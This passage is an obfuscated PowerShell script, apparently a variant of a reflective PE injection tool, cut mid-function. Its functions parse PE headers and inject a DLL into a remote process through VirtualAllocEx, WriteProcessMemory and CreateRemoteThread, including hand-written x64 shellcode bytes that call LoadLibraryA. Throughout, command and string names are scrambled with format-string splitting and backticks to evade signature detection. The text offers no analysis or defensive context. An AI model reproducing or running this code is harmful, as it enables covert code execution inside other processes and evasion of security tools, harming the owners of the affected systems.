		    if (${ReM`oTEThRe`AdH`AnDlE} -eq   (&("{0}{1}" -f'i','teM')  ('VARI'+'Able'+':bq'+'ta')  )."vA`lUE"::"z`eRo")
		    {
			    &("{2}{3}{1}{0}"-f'e','erbos','Wri','te-V') ("{13}{6}{0}{11}{4}{12}{2}{9}{15}{10}{1}{7}{5}{14}{3}{8}"-f 'crea','a','te th','n','n',' handle is','ror ','d','ull','rea','e','ti','g remo','Er',' ','d, thr')
		    }
		
		    return ${rEmO`T`EthREAD`HanD`lE}
	    }

	

	    Function g`et-ImAG`ENTHE`ADe`RS
	    {
		    Param(
		    [Parameter(PositiON = 0, maNdatorY = ${Tr`Ue})]
		    [IntPtr]
		    ${PE`Hand`Le},
		
		    [Parameter(pOSitIon = 1, ManDatORy = ${T`RuE})]
		    [System.Object]
		    ${wI`N32TY`PEs}
		    )
		
		    ${N`THeaDe`R`s`inFO} = &("{0}{2}{1}" -f 'New-','ject','Ob') ("{0}{3}{1}{2}" -f'Sys','jec','t','tem.Ob')
		
		    
		    ${DoS`H`eAdEr} =  (  &("{1}{2}{0}"-f 'AbLe','VAR','i')  ("{1}{0}" -f'i2Wh','Zf') -vAluEoN )::"pTrtoSt`Ruc`Ture"(${P`E`hAnDlE}, [Type]${wiN32`TYP`eS}."Ima`g`e`_doS_HEA`DER")

		    
		    [IntPtr]${NTH`ea`DE`R`spTR} = [IntPtr](&("{2}{3}{4}{0}{1}{5}" -f'ns','i','Add-S','ign','edIntAsU','gned') ([Int64]${PeHA`Nd`Le}) ([Int64][UInt64]${D`OshE`AdeR}."E_l`FAn`EW"))
		    ${n`Thea`deR`si`NfO} | &("{1}{2}{0}"-f 'mber','Add','-Me') -MemberType ("{1}{0}{3}{2}" -f 'ePro','Not','ty','per') -Name ("{1}{0}{2}"-f 't','NtHeadersP','r') -Value ${N`Th`EaDer`sPTR}
		    ${ImA`gEn`Th`E`Aders64} =   (&("{0}{1}" -f 'iTe','M')  ("{2}{1}{0}{3}"-f 'iAblE:zfi2w','r','vA','h') )."v`ALue"::"pT`R`TOst`RuC`Ture"(${N`ThEAd`ERsP`TR}, [Type]${w`IN`32ty`pES}."i`m`AG`e`_NT`_HEadErs64")
		
		    
	        if (${i`MA`ge`NThEAd`ers64}."sIgn`A`TUrE" -ne 0x00004550)
	        {
	            throw ("{5}{1}{6}{0}{3}{2}{4}" -f 'AGE_NT',' I',' sign','_HEADER','ature.','Invalid','M')
	        }
		
		    if (${IMAgEnt`h`e`AdErs64}."opTI`O`NALHEadeR"."Ma`Gic" -eq ("{2}{6}{1}{5}{3}{4}{0}" -f '64_MAGIC','OPTIO','IMA','AL_H','DR','N','GE_NT_'))
		    {
			    ${n`TheADERs`I`NFo} | &("{1}{0}{2}"-f 'd-Me','Ad','mber') -MemberType ("{2}{0}{1}" -f 'ot','eProperty','N') -Name ("{2}{0}{3}{1}{4}"-f'MAG','HE','I','E_NT_','ADERS') -Value ${iM`AgenT`HEAD`ERS64}
			    ${N`THEaD`eRsi`N`Fo} | &("{1}{0}{2}"-f 'e','Add-Memb','r') -MemberType ("{1}{3}{0}{2}" -f'er','Note','ty','Prop') -Name ("{1}{0}"-f 'E64Bit','P') -Value ${t`RUe}
		    }
		    else
		    {
			    ${im`AgeNT`hE`A`dErs32} =   (  &("{1}{0}"-f '-item','get') ("{0}{2}{3}{1}"-f 'VARiAB','i2wh','l','E:zF') )."v`ALue"::"P`TrToST`Ru`CtU`Re"(${NTHE`Ad`ER`SptR}, [Type]${W`In`32Ty`pEs}."i`mag`E_nt_`hEADERs32")
			    ${N`T`headErs`in`FO} | &("{1}{3}{0}{2}" -f'Mem','A','ber','dd-') -MemberType ("{2}{1}{0}"-f 'y','opert','NotePr') -Name ("{0}{3}{4}{1}{2}"-f'IMAGE_','E','RS','N','T_HEAD') -Value ${i`mA`ge`NTheade`Rs32}
			    ${n`TheAd`Er`Sinfo} | &("{2}{1}{0}" -f'mber','dd-Me','A') -MemberType ("{1}{3}{0}{2}" -f 'er','Note','ty','Prop') -Name ("{1}{0}{2}" -f'4Bi','PE6','t') -Value ${f`AL`se}
		    }
		
		    return ${n`ThE`A`DerS`InfO}
	    }


	    
	    Function G`e`T-p`EbAsiCInFO
	    {
		    Param(
		    [Parameter( posiTION = 0, MandatorY = ${t`Rue} )]
		    [Byte[]]
		    ${peb`yt`eS},
		
		    [Parameter(PosITioN = 1, MAnDaTOrY = ${tr`Ue})]
		    [System.Object]
		    ${WI`N32t`y`Pes}
		    )
		
		    ${p`eIN`FO} = &("{2}{0}{1}"-f 'b','ject','New-O') ("{1}{3}{0}{4}{2}"-f'em.','Sys','ct','t','Obje')
		
		    
		    [IntPtr]${UNMa`N`AGEdP`EB`y`TES} =  (  &("{1}{0}"-f'riaBlE','VA') ('Z'+'fI2wH') )."V`AlUe"::("{0}{1}{2}"-f'A','llocH','Global').Invoke(${PEb`YtEs}."leN`GTh")
		      ( &("{0}{1}" -f 'G','CI') ("{0}{2}{3}{1}"-f'va','2Wh','RiABLe:Zf','I'))."Val`Ue"::("{0}{1}" -f'Co','py').Invoke(${pe`BYT`Es}, 0, ${UNm`ANAge`d`PEBYTES}, ${PE`B`yteS}."leNg`Th") | &("{1}{0}"-f 'ut-Null','O')
		
		    
		    ${N`T`H`Ea`dErSiNFO} = &("{0}{1}{2}{3}" -f'Ge','t-Image','NtHe','aders') -PEHandle ${un`mAN`AgeDPeBY`TES} -Win32Types ${wIN32`Ty`pEs}
		
		    
		    ${PE`Info} | &("{2}{0}{1}{3}" -f'e','m','Add-M','ber') -MemberType ("{2}{0}{1}" -f 'pert','y','NotePro') -Name ("{0}{1}" -f 'PE64Bi','t') -Value (${nt`HeaDeR`sInfO}."pe6`4BiT")
		    ${Pe`In`FO} | &("{1}{2}{3}{0}"-f'er','Add-M','em','b') -MemberType ("{2}{0}{1}"-f 'ePr','operty','Not') -Name ("{2}{0}{3}{1}"-f'inal','se','Orig','ImageBa') -Value (${n`THeaD`ERsINFo}."I`mA`Ge_nt_HEAd`ErS"."opt`iOnA`l`HEAdeR"."i`MAg`ebase")
		    ${P`E`infO} | &("{2}{1}{0}" -f'ber','m','Add-Me') -MemberType ("{0}{2}{3}{1}" -f 'Not','rty','eP','rope') -Name ("{2}{0}{1}" -f'O','fImage','Size') -Value (${N`THEaDEr`siN`Fo}."ImA`GE`_nt_he`A`DERs"."Op`T`io`NALhEAdeR"."S`I`ZEOFim`AgE")
		    ${p`E`INFo} | &("{0}{1}{2}"-f 'Add-','Mem','ber') -MemberType ("{1}{0}{2}{3}"-f'Prop','Note','e','rty') -Name ("{0}{1}{3}{2}"-f 'SizeOfH','ead','rs','e') -Value (${ntHE`AdE`Rs`inFo}."imAGE_n`T_`heAdeRs"."oPTi`on`AlHE`A`deR"."sIzEofHE`Ad`ERS")
		    ${p`EiNFo} | &("{1}{0}{2}"-f 'dd','A','-Member') -MemberType ("{1}{3}{0}{2}"-f 'rope','N','rty','oteP') -Name ("{3}{2}{1}{0}{4}"-f'ist','er','llCharact','D','ics') -Value (${n`Thea`DE`Rsin`Fo}."Im`AG`e_nt_`hEAders"."OpTIONAl`H`eAd`Er"."D`L`LcharacTEr`ISTICS")
		
		    
		      ( &('lS')  ('va'+'r'+'iabLE'+':ZF'+'i2wh'))."V`AlUE"::("{1}{3}{2}{0}" -f 'l','FreeHG','ba','lo').Invoke(${un`mAnag`eDPEByT`ES})
		
		    return ${Pein`Fo}
	    }


	    
	    
	    Function gEt-p`edETAIled`In`Fo
	    {
		    Param(
		    [Parameter( pOsitIon = 0, MaNdatOrY = ${t`RUE})]
		    [IntPtr]
		    ${PE`Ha`NDlE},
		
		    [Parameter(POSITION = 1, manDAtoRY = ${TR`Ue})]
		    [System.Object]
		    ${Wi`N3`2tY`PeS},
		
		    [Parameter(posiTIoN = 2, ManDAtOrY = ${tr`Ue})]
		    [System.Object]
		    ${w`IN32c`O`NsTAN`TS}
		    )
		
		    if (${PE`Hand`le} -eq ${nU`LL} -or ${PeHA`N`dLE} -eq  ( &("{0}{1}{2}"-f 'cHiLD','it','Em')  ("{2}{3}{0}{1}"-f 'Le',':bqTa','VArIa','b'))."VAl`UE"::"zE`Ro")
		    {
			    throw ("{2}{6}{3}{1}{5}{4}{0}" -f 'ero','le is null ','PE','nd','r IntPtr.Z','o','Ha')
		    }
		
		    ${pe`i`NFO} = &("{2}{1}{0}" -f 't','ec','New-Obj') ("{2}{0}{1}" -f'em.O','bject','Syst')
		
		    
		    ${nTheAd`ER`si`N`FO} = &("{4}{2}{3}{1}{5}{0}"-f 'tHeaders','e','Ima','g','Get-','N') -PEHandle ${PE`HA`NdlE} -Win32Types ${w`I`N32Ty`pes}
		
		    
		    ${P`E`InfO} | &("{2}{1}{0}"-f'er','mb','Add-Me') -MemberType ("{1}{0}{2}{3}"-f 'eProper','Not','t','y') -Name ("{1}{0}"-f 'le','PEHand') -Value ${pe`HaNDlE}
		    ${Pei`Nfo} | &("{1}{0}{2}" -f 'em','Add-M','ber') -MemberType ("{1}{2}{0}{3}" -f'tePr','N','o','operty') -Name ("{3}{2}{4}{1}{0}" -f'ERS','AD','E','IMAG','_NT_HE') -Value (${NT`H`eAd`ERs`InfO}."I`mA`ge_NT_HEadERS")
		    ${pEI`NFO} | &("{3}{0}{2}{1}"-f'-Memb','r','e','Add') -MemberType ("{1}{0}{3}{2}"-f 'o','N','perty','tePro') -Name ("{2}{1}{3}{0}" -f 'Ptr','t','N','Headers') -Value (${NTHE`ADe`RS`infO}."Nthea`D`ERSpTR")
		    ${P`einFO} | &("{2}{1}{0}"-f 'ber','m','Add-Me') -MemberType ("{1}{0}{2}"-f'Prope','Note','rty') -Name ("{0}{1}" -f 'PE64','Bit') -Value (${NtheADe`R`SIN`FO}."pE64`BIt")
		    ${pEI`NfO} | &("{3}{1}{0}{2}" -f '-','dd','Member','A') -MemberType ("{2}{1}{0}"-f 'perty','Pro','Note') -Name ("{2}{1}{0}"-f 'Image','Of','Size') -Value (${n`The`AD`e`RSiNFO}."IMaGe_nt`_HEad`erS"."OPTionaL`hE`A`dER"."SI`z`eoF`iMAge")
		
		    if (${P`EinfO}."PE64B`It" -eq ${T`RuE})
		    {
			    [IntPtr]${SECtI`O`NH`e`ADER`pTr} = [IntPtr](&("{0}{1}{2}{3}{4}" -f 'Add-Sig','nedIntAs','Unsi','gn','ed') ([Int64]${PEi`N`FO}."Nt`HEa`DERspTr") (  (  &("{2}{1}{0}"-f'E','L','VariAB') ("z"+"FI2"+"wh"))."v`ALUE"::"sI`ze`OF"([Type]${W`In32t`YpES}."ima`gE`_NT_HEAD`ER`S64")))
			    ${pe`iN`Fo} | &("{2}{1}{0}{3}"-f 'm','d-Me','Ad','ber') -MemberType ("{2}{3}{1}{0}"-f'erty','op','NoteP','r') -Name ("{3}{4}{0}{1}{2}"-f 'ti','onHeaderPt','r','S','ec') -Value ${sE`CtIOnHeA`de`RPTr}
		    }
		    else
		    {
			    [IntPtr]${sect`ionHe`ADEr`ptR} = [IntPtr](&("{1}{2}{6}{4}{0}{3}{5}"-f'd','A','dd-','IntA','e','sUnsigned','Sign') ([Int64]${pEI`NFo}."N`THEa`D`eRSptr") (  (  &("{1}{0}" -f'aRiAble','V')  ('ZF'+'i2'+'WH') )."VAl`Ue"::"SIZe`of"([Type]${W`I`N`32TyPeS}."I`maGE`_n`T_H`eAd`ers32")))
			    ${p`EiN`Fo} | &("{0}{2}{1}" -f'Ad','er','d-Memb') -MemberType ("{0}{2}{1}" -f 'NotePr','ty','oper') -Name ("{2}{1}{3}{0}"-f 'r','ctio','Se','nHeaderPt') -Value ${sEC`TiOnh`eAD`er`ptr}
		    }
		
		    if ((${Nthe`A`DERS`INFo}."iMAge`_`NT`_heADerS"."FI`Leh`EAdER"."c`haR`A`cte`RIsTICS" -band ${wIn3`2C`On`StANtS}."i`MAgE`_fILE_D`Ll") -eq ${win3`2c`o`NsT`ANtS}."IM`AgE_fIl`E_`Dll")
		    {
			    ${pEi`NFO} | &("{1}{3}{2}{0}"-f 'ber','Add','Mem','-') -MemberType ("{2}{1}{0}{3}"-f 'roper','P','Note','ty') -Name ("{2}{1}{0}"-f 'ype','ileT','F') -Value 'DLL'
		    }
		    elseif ((${N`THeAD`ERs`INfO}."IM`AgE`_NT_heAdE`RS"."fIL`EhE`ADER"."c`HaRA`Ct`eRis`TIcS" -band ${wi`N3`2coNstANTs}."imAGE`_`FiLe`_EXEcutAB`l`E_ImAGe") -eq ${WIn3`2CONS`T`An`TS}."i`mAge`_fILE_EX`EcuTA`B`LE_ImAgE")
		    {
			    ${pei`NfO} | &("{1}{2}{0}"-f'r','Add-Me','mbe') -MemberType ("{3}{2}{0}{1}" -f'r','ty','ope','NotePr') -Name ("{0}{1}{2}"-f'Fil','eTyp','e') -Value 'EXE'
		    }
		    else
		    {
			    Throw ("{3}{2}{1}{7}{6}{4}{5}{0}" -f 'L','is not ','file ','PE ','or D','L','EXE ','an ')
		    }
		
		    return ${PeI`NFO}
	    }
	
	
	    Function i`MPOrT-Dl`l`I`NRemOTe`pR`oCesS
	    {
		    Param(
		    [Parameter(PoSitioN=0, maNDatorY=${tr`UE})]
		    [IntPtr]
		    ${RE`mOtEpR`OcHA`NDLE},
		
		    [Parameter(POSItiOn=1, mANdatoRy=${tR`UE})]
		    [IntPtr]
		    ${IMPo`RTD`l`lPaThP`Tr}
		    )
		
		    ${PTR`S`IZE} =  ${Z`FI2WH}::"sIz`E`of"([Type][IntPtr])
		
		    ${iMp`oRtdLlpA`Th} =  (  &("{0}{1}{2}{3}" -f 'geT-C','Hi','LdITE','m') ('VArIAb'+'l'+'E'+':z'+'FI2WH'))."vA`LuE"::("{2}{1}{3}{0}"-f'ingAnsi','S','PtrTo','tr').Invoke(${Im`POrTDlL`Path`pTR})
		    ${Dll`PatHsI`zE} = [UIntPtr][UInt64]([UInt64]${iMp`OR`TdL`l`PatH}."l`eNGtH" + 1)
		    ${rIM`pO`RT`DLlp`ATh`ptR} = ${wI`N3`2FUnCTI`ONS}."Vi`RTUaLa`l`L`OcEx"."iNv`okE"(${R`EMoTe`proC`hANDLE},   (  &("{1}{0}{2}"-f'a','v','riable')  ("{1}{0}"-f 'a','bqT') )."va`lUe"::"ze`Ro", ${dLlPAthS`i`Ze}, ${win32CoNS`T`A`NtS}."meM`_c`OmmiT" -bor ${Wi`N32`C`oNstAnTS}."ME`M`_r`EseRvE", ${wIn32cO`Nsta`N`Ts}."PAg`E_reAd`wRi`TE")
		    if (${r`i`mpor`TDLlp`A`THPTR} -eq  (&("{1}{0}" -f'Le','variab')  ("B"+"QTa") -Va)::"Ze`Ro")
		    {
			    Throw ("{7}{4}{0}{6}{9}{1}{8}{3}{2}{5}"-f'o allocate','r','p','te ','le t','rocess',' memory in ','Unab','emo','the ')
		    }

		    [UIntPtr]${N`UMB`YTe`S`WritTEn} =  (&("{1}{2}{0}"-f'ABLe','vaR','i')  ("{0}{1}"-f '0','OM41') )."v`ALuE"::"Z`ero"
		    ${S`UcCesS} = ${w`I`N3`2f`UncTions}."WR`ITE`P`ROCE`SSmEMOrY"."INVO`kE"(${rEmo`T`Epr`oC`HAnDLe}, ${rIM`poRtd`lL`p`AthPtR}, ${imPoRtDllpA`T`H`pTr}, ${d`Ll`PaThsI`ze}, [Ref]${NUmbYT`Es`w`RiTten})
		
		    if (${su`CC`ESs} -eq ${FA`L`Se})
		    {
			    Throw ("{5}{3}{9}{0}{11}{8}{6}{4}{2}{7}{10}{1}{12}"-f'DLL','e','ce','e','ro','Unabl','remote p','ss ','ath to ',' to write ','m',' p','mory')
		    }
		    if (${dllp`AT`hS`IZE} -ne ${NUm`ByT`ESwrItt`EN})
		    {
			    Throw ((("{17}{23}{4}{22}{13}{5}{12}{3}{15}{0}{8}{11}{18}{14}{7}{2}{21}{20}{9}{19}{1}{10}{16}{6}{24}" -f 'u','e ','when writi','ed am',' ',' e',' ',' ','nt',' path','re',' ','xpect','rite the','f bytes','o','mote','Did','o',' to load to th','DLL','ng a ','w','n8oFt','process'))-cRePLaCe '8oF',[chAR]39)
		    }
		
		    ${KE`RNel`3`2HAn`dLE} = ${WI`N32funC`TiO`NS}."g`ETmoDuLEHA`NDle"."in`V`OKe"(("{0}{1}{3}{2}"-f'ke','rn','l32.dll','e'))
		    ${l`OAdlib`R`ARyAad`DR} = ${wiN`32Fun`ctIo`Ns}."g`Etp`ROca`d`DrESS"."InVO`KE"(${K`E`RnEL`32HaNd`lE}, ("{0}{1}{3}{2}"-f 'Load','L','ryA','ibra')) 
		
		    [IntPtr]${dll`ADD`ResS} =   (  &('GI') ("V"+"arIABLE:"+"b"+"QtA") )."V`AluE"::"z`ero"
		    
		    
		    if (${PEi`N`FO}."pe`64BIT" -eq ${t`RUe})
		    {
			    
			    ${L`Oa`d`libRArYArETmeM} = ${wIn`3`2`FUNctI`oNS}."virtUalA`Ll`O`CeX"."iN`VoKe"(${R`E`mo`TEpROchANDle},   (&("{2}{1}{3}{0}"-f'AriabLE','T','gE','-v') ("b"+"QTa")  -VaL )::"Ze`RO", ${dLLPA`T`hsIzE}, ${Wi`N32C`O`NStAntS}."MEM`_ComM`IT" -bor ${wIN3`2cOns`T`A`NtS}."mE`M_Re`seRvE", ${Wi`N32C`OnStAn`TS}."p`AG`e`_REaDWrItE")
			    if (${L`OAdlibr`AryarET`mem} -eq   (  &("{2}{0}{1}{3}" -f 'A','B','GET-Vari','lE') ('b'+'QTA'))."v`ALUE"::"Z`ERO")
			    {
				    Throw ("{3}{1}{23}{5}{10}{14}{6}{20}{24}{11}{0}{18}{15}{13}{4}{2}{16}{19}{7}{21}{9}{8}{12}{17}{22}" -f'oc',' to al','return valu','Unable','he ','mor',' th','a','b','i','y i',' pr','ra','for t','n','s ','e of L','ry','es','o','e remot','dL','A','locate me','e')
			    }
			
			
			    
			    ${L`O`AdLIB`Ra`RySc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    ${LoADl`ibRAR`YS`c2} = @(0x48, 0xba)
			    ${L`O`AdlIBrarY`Sc3} = @(0xff, 0xd2, 0x48, 0xba)
			    ${LoaD`l`Ibra`RYs`c4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			    ${SC`Len`GtH} = ${LOA`DlibrAR`Y`sc1}."l`eNgTH" + ${l`oaDL`IbrA`RYSC2}."lE`NGTh" + ${Loa`dlibr`A`RysC3}."Le`Ngth" + ${loA`dliBr`A`R`Ysc4}."LeNG`Th" + (${pTR`SiZE} * 3)
			    ${S`CPS`mEM} =   ( &("{1}{2}{0}" -f 'bLE','Var','iA') ("{1}{0}"-f 'wH','zFI2')  -Va  )::("{1}{2}{0}"-f 'lobal','Alloc','HG').Invoke(${sC`L`ength})
			    ${sc`pSMem`o`RI`g`INal} = ${s`C`pSmem}
			
			    &("{0}{4}{2}{1}{3}" -f'Write-B','sToM','te','emory','y') -Bytes ${LO`ADL`iBrA`R`YSc1} -MemoryAddress ${sCp`s`mEm}
			    ${S`Cps`meM} = &("{6}{5}{4}{3}{2}{0}{1}" -f'ntAsU','nsigned','dI','ne','g','dd-Si','A') ${sC`Ps`mEM} (${LOadL`iB`R`ArySc1}."l`ENgTh")
			      ( &("{0}{2}{1}"-f'g','TeM','eT-i') ("Var"+"IAb"+"L"+"e:zfi2w"+"H"))."v`Alue"::("{3}{2}{1}{0}"-f'Ptr','ureTo','ct','Stru').Invoke(${r`i`mpoRtdl`LP`AThp`TR}, ${sC`p`smEm}, ${FaL`se})
			    ${scP`s`MEm} = &("{1}{3}{2}{4}{0}"-f 'ed','Add-Sig','e','n','dIntAsUnsign') ${S`CP`sMEM} (${P`TRsI`zE})
			    &("{0}{5}{3}{4}{2}{1}"-f'Write','y','r','Byt','esToMemo','-') -Bytes ${lO`AdLIB`Ra`RY`sc2} -MemoryAddress ${sc`pS`mEm}
			    ${S`cp`SmEM} = &("{6}{7}{5}{4}{1}{3}{0}{2}"-f 'sign','sU','ed','n','A','SignedInt','Ad','d-') ${SCp`s`meM} (${lOad`liBRaR`ySc2}."Le`NGTH")
			     (&("{0}{1}{3}{2}"-f 'GEt-v','Ar','AblE','I')  ("ZfI"+"2WH") -ValU  )::("{2}{0}{4}{1}{3}" -f 'ct','eToP','Stru','tr','ur').Invoke(${l`Oa`Dl`iBrARyaAddR}, ${scp`Sm`EM}, ${FAL`sE})
			    ${s`cpsmem} = &("{4}{0}{1}{3}{2}"-f'dd-S','ignedIntA','nsigned','sU','A') ${ScPS`m`em} (${p`T`RSiZe})
			    &("{2}{3}{1}{4}{0}"-f 'y','sToMemo','Write-','Byte','r') -Bytes ${lOADLibr`Ar`Ys`C3} -MemoryAddress ${SCp`sMeM}
			    ${Scp`SmEM} = &("{5}{4}{2}{6}{0}{1}{3}"-f'n','si','n','gned','d-Sig','Ad','edIntAsU') ${SCPS`mem} (${lO`A`dLI`BRA`RysC3}."l`ENGtH")
			      (&("{1}{0}{2}"-f 'r','VA','IAbLe')  ("ZFi"+"2w"+"h")  -VA)::("{3}{4}{1}{0}{2}"-f'eToP','ur','tr','S','truct').Invoke(${L`oadl`ib`R`AR`YAreTMem}, ${scp`s`Mem}, ${fa`L`Se})
			    ${s`CP`SmEM} = &("{3}{0}{2}{1}{5}{4}" -f'd','n','-Sig','Ad','ed','edIntAsUnsign') ${sC`P`SmeM} (${pT`RS`Ize})
			    &("{0}{1}{3}{2}" -f'Write-','Bytes','ry','ToMemo') -Bytes ${l`o`AD`LibRARY`sc4} -MemoryAddress ${S`C`PSMem}
			    ${ScP`sm`EM} = &("{6}{3}{5}{0}{2}{1}{4}"-f'dIntA','e','sUnsign','n','d','e','Add-Sig') ${sCp`Sm`EM} (${Loa`dlIbR`AR`ysc4}."lEN`GTH")

			
			    ${R`S`cADdr} = ${win`32`F`Un`CtiOns}."VIRtu`AL`ALlo`cEX"."i`NVOKe"(${R`eMOt`EPR`OchAnDlE},  (  &("{1}{2}{3}{0}"-f 'LE','GET-varI','A','B')  ("{1}{0}" -f 'a','BqT'))."VAl`Ue"::"Z`ero", [UIntPtr][UInt64]${scL`EngTH}, ${win`32`COnstANtS}."MEm`_co`Mmit" -bor ${Wi`N`32C`ONsTANTs}."ME`M_reS`E`RVe", ${wIN32co`NS`TanTs}."PA`G`E_Ex`e`C`UTe_readWr`Ite")
			    if (${rsC`AD`DR} -eq   ${b`qTA}::"z`eRo")
			    {
				    Throw ("{4}{1}{8}{0}{7}{2}{10}{5}{12}{3}{11}{6}{9}" -f 'oca','able to ','e m','e remote proce','Un','mory in ','or shellc','t','all','ode','e','ss f','th')
			    }
			
			    ${sUC`CESS} = ${W`i`N`32functions}."wRItePR`oc`E`SsmeM`oRy"."iNv`OKE"(${Re`MoTEP`ROCHa`N`dlE}, ${RsCaD`DR}, ${S`c`psmem`OR`IgInAL}, [UIntPtr][UInt64]${sc`len`G`TH}, [Ref]${nUm`B`YtE`SWR`It`Ten})
			    if ((${sUccE`Ss} -eq ${fa`l`Se}) -or ([UInt64]${N`U`m`ByTe`sW`RItteN} -ne [UInt64]${Sc`lENGTh}))
			    {
				    Throw ("{2}{0}{6}{4}{5}{9}{1}{3}{8}{7}"-f'l','ellcode to remote','Unab',' pr','o wri','te ','e t','mory.','ocess me','sh')
			    }
			
			    ${rThR`eA`dh`AND`le} = &("{0}{1}{2}{3}{4}" -f 'In','voke-Cr','e','ateRemot','eThread') -ProcessHandle ${rEMO`T`eprO`ChanDle} -StartAddress ${rSCA`D`Dr} -Win32Functions ${WiN3`2`FUncT`IONS}
			    ${R`esU`Lt} = ${W`IN32Fu`Ncti`O`Ns}."W`AitF`OR`SIN`Gl`eObJECt"."In`Vo`ke"(${r`THr`e`AdH`ANdle}, 20000)
			    if (${RES`ULt} -ne 0)
			    {
				    Throw ("{1}{6}{10}{3}{4}{2}{15}{12}{11}{9}{16}{0}{13}{14}{5}{7}{17}{8}"-f'l ','C','m',' to Crea','teRe','dd','a','res','ed.','to ca','ll','ead ','hr','Ge','tProcA','oteT','l','s fail')
			    }
			
			    
			    [IntPtr]${rEt`URN`Va`l`MEM} =   ${zf`I`2Wh}::("{2}{1}{0}"-f'ocHGlobal','l','Al').Invoke(${PTr`SIzE})
			    ${ReSu`lT} = ${wi`N32F`U`NCtIonS}."R`eADpR`OCes`SmemoRY"."i`NV`oKE"(${R`emote`P`RocHanDle}, ${loadL`iBRA`Ryaretm`eM}, ${RE`T`UrNV`ALM`eM}, [UIntPtr][UInt64]${p`TRS`ize}, [Ref]${numByTESW`R`I`TTeN})
			    if (${R`E`sulT} -eq ${F`Al`sE})
			    {
				    Throw ("{8}{5}{3}{1}{7}{6}{4}{0}{2}"-f 'emory f','o','ailed',' t','ProcessM','l','d',' Rea','Cal')
			    }
			    [IntPtr]${Dl`LadDr`eSS} =   ( &("{1}{0}{2}{3}"-f 'iab','get-Var','L','e') ("{1}{0}" -f'fI2wh','z') -vAlUE  )::"pt`R`TOstRucT`UrE"(${Re`Tur`NvaL`m`EM}, [Type][IntPtr])

			    ${wIn`32f`U`NCTIons}."v`iRtuALFR`eEex"."invO`kE"(${rE`Mot`E`ProCh`And`Le}, ${Lo`AdL`IbrARY`ARe`TmEm}, [UIntPtr][UInt64]0, ${WI`N`32cONS`Ta`NTS}."mE`m_rE`le`ASE") | &("{2}{0}{1}" -f '-N','ull','Out')
			    ${wiN3`2F`U`NCTIOns}."VI`RtualFree`ex"."InVo`Ke"(${rEmO`TEpR`oCh`A`NDle}, ${rsCAd`DR}, [UIntPtr][UInt64]0, ${w`In32cO`NsTAntS}."m`em_R`eleasE") | &("{1}{2}{0}"-f'-Null','Ou','t')
		    }
		    else
		    {
			    [IntPtr]${rtHre`AdHa`NDLE} = &("{1}{3}{2}{0}{4}"-f 'h','I','moteT','nvoke-CreateRe','read') -ProcessHandle ${remOte`PR`oChAn`DLe} -StartAddress ${LOAdliB`RArYa`A`d`Dr} -ArgumentPtr ${R`impORtd`l`lpAthPTr} -Win32Functions ${wIN32Fu`Nc`Tions}
			    ${R`eSUlt} = ${wIN32FuncTI`O`NS}."wAI`TF`O`RsiNGleObJEcT"."I`Nvoke"(${rthREa`Dhan`Dle}, 20000)
			    if (${R`Es`UlT} -ne 0)
			    {
				    Throw ("{9}{7}{2}{6}{3}{4}{8}{5}{0}{1}" -f's fa','iled.','ateRem','read ','to ','l GetProcAddres','oteTh','to Cre','cal','Call ')
			    }
			
			    [Int32]${exI`T`coDE} = 0
			    ${reSu`lt} = ${W`iN32f`UnCt`IONs}."GETExitcOd`ETHR`e`Ad"."Inv`OKE"(${rT`HR`eAdHAND`le}, [Ref]${e`xi`TcoDe})
			    if ((${REsu`lt} -eq 0) -or (${exi`T`coDe} -eq 0))
			    {
				    Throw ("{2}{5}{3}{7}{0}{4}{6}{1}"-f'C','d failed','Cal','o ','odeThr','l t','ea','GetExit')
			    }
			
			    [IntPtr]${D`ll`AD`DrESS} = [IntPtr]${eXiTc`O`dE}
		    }
		
		    ${wIn`32FUnCT`I`o`Ns}."VI`RtuALFR`e`E`eX"."i`N`VOKe"(${ReMOTEp`ROc`H`AND`Le}, ${r`imPo`R`TdL`lPath`pTr}, [UIntPtr][UInt64]0, ${WI`N3`2cOnstA`N`Ts}."meM_`Re`LEASe") | &("{0}{1}{2}"-f 'O','u','t-Null')
		
		    return ${dlLa`DD`Re`ss}
	    }
	
	
	    Function gE`T-`REMote`PrOCAD`DRe`SS
	    {
		    Param(
		    [Parameter(pOsitIon=0, maNDatory=${t`RUE})]
		    [IntPtr]
		    ${ReM`oTeP`RoCh`ANdLE},
		
		    [Parameter(pOsITioN=1, mANDaTORY=${t`RUe})]
		    [IntPtr]
		    ${r`EmoTE`d`lLhan`dLe},
		
		    [Parameter(pOsitiON=2, mANdaTORY=${Tr`UE})]
		    [String]
		    ${fUNCTI`o`N`NAME}
		    )

		    ${p`TrS`IZe} =   ${zf`i2`WH}::"SIze`of"([Type][IntPtr])
		    ${fUnc`Ti`On`NaM`ePtr} =  ${ZF`I2wH}::("{4}{3}{1}{2}{0}"-f 'nsi','ToHGloba','lA','tring','S').Invoke(${f`Un`CTIO`NnamE})
		
		    
		    ${FU`NC`Ti`ONNAmE`SIzE} = [UIntPtr][UInt64]([UInt64]${FuncTi`onN`AMe}."LEN`Gth" + 1)
		    ${RFUn`cNAME`PTr} = ${WIN3`2fUNCtIO`NS}."Vir`Tua`lalLocEx"."iNV`O`KE"(${rE`mOTEPROc`HaN`dle},  (&('LS') ("VAr"+"IaBLE:B"+"qt"+"a")  )."v`AluE"::"zE`RO", ${FUnctI`OnnAM`E`SiZE}, ${WiN`32`ConStaN`TS}."MEM_c`o`mmIT" -bor ${wiN32`Consta`N`Ts}."Mem`_reSeR`VE", ${WI`N`3`2COnStAnTs}."P`A`Ge_R`EADWRItE")
		    if (${RFu`Nc`NAMEP`TR} -eq   ${bQ`Ta}::"zE`RO")
		    {
			    Throw ("{7}{6}{11}{1}{10}{2}{5}{8}{3}{9}{4}{0}"-f 'ess','lo',' ','ory i','mote proc','me',' a','Unable to','m','n the re','cate','l')
		    }

		    [UIntPtr]${numby`T`E`Sw`RiTten} =  (&("{1}{0}"-f 'ir','D') ('Va'+'RI'+'Abl'+'e:0om41'))."VaL`Ue"::"ze`Ro"
		    ${s`UcC`eSS} = ${wIN32`FuN`c`TIoNs}."WRitep`Ro`C`eS`SMEmorY"."inV`OKE"(${REmo`TEP`R`oCHAN`Dle}, ${RFUnCnA`mEP`Tr}, ${fuNc`TI`O`NN`AMEPtR}, ${FU`NCt`i`O`NnamEsI`zE}, [Ref]${NuMb`y`Tes`WrIt`TEN})
